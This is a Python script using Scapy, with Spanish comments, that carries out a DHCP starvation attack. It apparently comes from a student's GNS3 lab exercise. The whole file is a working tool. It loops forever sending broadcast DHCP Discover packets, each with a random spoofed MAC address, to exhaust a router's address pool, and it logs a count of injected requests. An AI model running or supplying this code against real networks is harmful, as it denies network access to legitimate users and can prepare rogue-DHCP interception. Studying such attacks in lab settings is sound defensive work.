import sys
import os
import time
from struct import pack
from scapy.all import *

# ---- CONFIGURACIÓN DE VARIABLES CON TU MATRÍCULA (2024-2421) ----
# Monitorea la interfaz local de tu máquina atacante en GNS3
interface = "eth0"
# -----------------------------------------------------------------

if os.geteuid() != 0:
    sys.exit("[-] Ejecuta este script usando sudo.")

print("[+] Iniciando inundación masiva DHCP (DHCP Starvation)...")
print("[+] Agotando el pool de direcciones IP del Router...")

contador = 0

try:
    while True:
        # Generamos una dirección MAC de origen totalmente aleatoria
        mac_falsa = RandMAC()
        
        # Formateamos los bytes de la MAC para inyectarlos en el campo chaddr de BOOTP
        mac_bytes = pack('!6B', *[int(x, 16) for x in mac_falsa.split(':')])
        chaddr_pad = mac_bytes + b'\x00' * 10

        # Construimos el paquete DHCP Discover malicioso destinado a broadcast
        packet = (
            Ether(src=mac_falsa, dst="ff:ff:ff:ff:ff:ff") /
            IP(src="0.0.0.0", dst="255.255.255.255") /
            UDP(sport=68, dport=67) /
            BOOTP(chaddr=chaddr_pad, xid=RandInt()) /
            DHCP(options=[("message-type", "discover"), "end"])
        )
        
        # Enviamos la trama por la interfaz física
        sendp(packet, iface=interface, verbose=False)
        contador += 1
        
        # Imprimimos logs cada 100 paquetes para monitorear la inundación
        if contador % 100 == 0:
            print(f"[!] {contador} peticiones DHCP Discover falsas inyectadas...")
            time.sleep(0.05)  # Pequeña pausa para estabilidad del switch emulado
except KeyboardInterrupt:
    print(f"\n[-] Ataque detenido de forma segura. Se enviaron {contador} peticiones masivas.")
